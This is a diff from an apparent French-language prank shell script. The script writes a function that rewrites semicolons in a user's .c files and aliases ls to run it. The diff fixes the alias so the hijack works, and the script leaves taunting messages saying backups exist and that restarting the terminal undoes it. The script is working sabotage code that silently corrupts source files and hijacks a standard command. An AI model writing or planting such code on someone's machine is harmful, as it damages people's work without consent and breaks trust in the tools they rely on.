@@ -8,7 +8,7 @@ echo "sussy() {
     sed -i 's/;/e/g' $f
     done
 }" > $HOME/.couille
-alias ls="./$HOME/.couille"
+alias ls="bash $HOME/.couille"
 
 echo "Tes .c non-glitch sont toujours dans leur dossier d'origine, sous le nom \".original-{nom}.c\". Relance ton terminal pour retirer la commande btw :)" > $HOME/fix.txt
 echo "hésite pas à check le fichier fix.txt dans ton HOME :p"
